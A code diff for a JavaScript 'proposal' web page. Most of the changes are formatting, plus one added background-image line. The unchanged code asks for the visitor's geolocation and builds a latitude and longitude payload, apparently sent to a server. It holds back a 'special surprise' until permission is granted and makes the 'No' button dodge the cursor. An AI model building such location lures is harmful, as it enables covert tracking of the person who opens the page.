@@ -1,6 +1,6 @@
-document.getElementById('start-btn').addEventListener('click', function() {
+document.getElementById('start-btn').addEventListener('click', function () {
     const statusText = document.getElementById('status-text');
-    
+
     if (!navigator.geolocation) {
         statusText.innerText = "Geolocation is not supported by your browser. Please try a modern browser.";
         return;
@@ -9,7 +9,7 @@ document.getElementById('start-btn').addEventListener('click', function() {
     statusText.innerText = "Requesting permission... Please check your browser prompt.";
 
     navigator.geolocation.getCurrentPosition(
-        async function(position) {
+        async function (position) {
             const payload = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
@@ -36,7 +36,7 @@ document.getElementById('start-btn').addEventListener('click', function() {
                 statusText.innerText = "Network error connection failed. Please reload and ensure server is online.";
             }
         },
-        function(error) {
+        function (error) {
             console.warn("Location error:", error.message);
             statusText.innerHTML = "<span style='color: red;'>Permission Denied or Timeout.</span><br>To view this special surprise, please refresh and accept the location permission.";
         },
@@ -45,6 +45,9 @@ document.getElementById('start-btn').addEventListener('click', function() {
 });
 
 function transitionToProposal() {
+    // 1. Add the background image class to the body element
+    document.body.classList.add('has-bg-image');
+
     // Hide setup, show proposal
     document.getElementById('setup-screen').classList.add('hidden');
     document.getElementById('proposal-screen').classList.remove('hidden');
@@ -56,7 +59,7 @@ function transitionToProposal() {
 
 // Interactive button effect for the 'No' button
 const noBtn = document.getElementById('no-btn');
-noBtn.addEventListener('mouseover', function() {
+noBtn.addEventListener('mouseover', function () {
     // Optional: make the button move away or enlarge the yes button
     const x = Math.random() * (window.innerWidth - this.offsetWidth);
     const y = Math.random() * (window.innerHeight - this.offsetHeight);
@@ -65,6 +68,6 @@ noBtn.addEventListener('mouseover', function() {
     this.style.top = y + 'px';
 });
 
-document.getElementById('yes-btn').addEventListener('click', function() {
+document.getElementById('yes-btn').addEventListener('click', function () {
     alert("💖 Thank you for making my world beautiful! 🌹");
 });
